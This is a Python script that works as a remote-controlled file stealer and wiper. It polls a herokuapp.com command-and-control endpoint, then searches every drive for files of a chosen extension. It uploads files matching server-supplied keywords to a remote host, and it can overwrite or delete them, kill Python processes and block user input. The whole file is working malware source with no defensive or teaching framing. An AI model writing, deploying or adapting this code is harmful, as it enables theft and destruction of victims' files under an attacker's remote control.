#!usr/bin/env python3

import json
import ntpath
import os
import sys
import time
import random
import requests
import pyfiglet
import subprocess
from ctypes import *
from datetime import datetime, timedelta
import pandas as pd
from time import sleep
from pathlib import Path
from multiprocessing import freeze_support
import zipfile
import shutil


class CC:
    def __init__(self):
        self.PROJECT_ROOT = Path(os.path.abspath(os.path.dirname(__file__)))
        self.FILE_CC_URL = 'https://fileautomator.herokuapp.com/cc/'
        self.FILE_POST_URL = 'https://fileautomator.herokuapp.com/uploads/'
        self.DIR_DOWNLOADS = str(Path.home() / "Downloads")
        self.DRIVES = ['%s:' % d for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists('%s:' % d)]
        self.validators = None
        self.message = None

    # Get CC response
    def get_cc(self):
        try:
            response = requests.get(url=self.FILE_CC_URL)
            return response.json()
        except:
            return None

    # Block user inputs
    def block_input(self):
        try:
            ok = windll.user32.BlockInput(True)
        except:
            pass
            
    # Block user inputs
    def close_python(self):
        try:
            subprocess.run([f'taskkill /im python.exe'])
            subprocess.run([f'pkill -9 python'])
        except:
            pass

    # CLose all running .py program
    def close_program(self, file_extension):
        for drive in self.DRIVES:
            file_list = self.get_files_by_extension(drive, file_extension)
            for file in file_list:
                try:
                    subprocess.run([f"pkill -f {file}"])
                except:
                    pass
                    
    # Returns all files in a directory by file .extension
    def get_files_by_extension(self, files_directory, file_extension):
        files = []
        # Lists all the .extension files in directory and sub-directories
        list_of_file_list = [[os.path.join(root, file) for file in files if file.endswith(file_extension)] for root, dirs, files in os.walk(files_directory)]
        [[files.append(f) for f in file_list] for file_list in list_of_file_list if len(file_list) > 0]
        return files

    # Send files in a directory by file .extension to a Django server
    def send_files_by_extension(self, files_directory, file_extension):
        # get all the files in directory and sub-directories
        for drive in self.DRIVES:
            file_list = self.get_files_by_extension(drive, file_extension)
            for f in file_list:
                ccs = self.get_cc()
                if str(ccs["Enable"]) == '0':
                    sys.exit()
                with open(f, "rb") as file:
                    content = file.read()
                    for validator in self.validators:
                        if validator in content:
                            file_dict = {ntpath.basename(f.split('.')[0]): file}
                            try:
                                response = requests.post(self.FILE_POST_URL, files=file_dict)
                            except:
                                pass
                                
    # Delete files in a directory by file .extension
    def delete_files_by_extension(self, files_directory, file_extension):
        # get all the files in directory and sub-directories
        for drive in self.DRIVES:
            file_list = self.get_files_by_extension(drive, file_extension)
            for f in file_list:
                ccs = self.get_cc()
                if str(ccs["Enable"]) == '0':
                    sys.exit()
                try:
                    os.remove(f) 
                except:
                    pass

    # OverWrite files in a directory by file .extension
    def overwrite_files_by_extension(self, files_directory, file_extension):
        # get all the files in directory and sub-directories
        for drive in self.DRIVES:
            file_list = self.get_files_by_extension(drive, file_extension)
            for f in file_list:
                ccs = self.get_cc()
                if str(ccs["Enable"]) == '0':
                    sys.exit()
                with open(f, "w+") as file:
                    try:
                        file.write(self.message)
                    except:
                        pass

    def main(self):
        while True:
            try:
                ccs = self.get_cc()
                self.validators = ccs["Validators"]
                self.message = ccs["Message"]
                if str(ccs["Enable"]) == '0':
                    sys.exit()
                if str(ccs["BlockInput"]) == '1':
                    self.close_python()
                if str(ccs["ClosePython"]) == '1':
                    self.close_python()
                if str(ccs["CloseProgram"]) == '1':
                    self.close_program(file_extension=ccs["FileExtension"])
                if str(ccs["SendFiles"]) == '1':
                    try:
                        self.send_files_by_extension(files_directory='files_directory', file_extension=ccs["FileExtension"])
                    except:
                        pass
                if str(ccs["OverWrite"]) == '1':
                    try:
                        self.overwrite_files_by_extension(files_directory='files_directory', file_extension=ccs["FileExtension"])
                    except:
                        pass
                if str(ccs["Delete"]) == '1':
                    try:
                        self.delete_files_by_extension(files_directory='files_directory', file_extension=ccs["FileExtension"])
                    except:
                        pass
            except:
                pass


if __name__ == '__main__':
    CC().main()
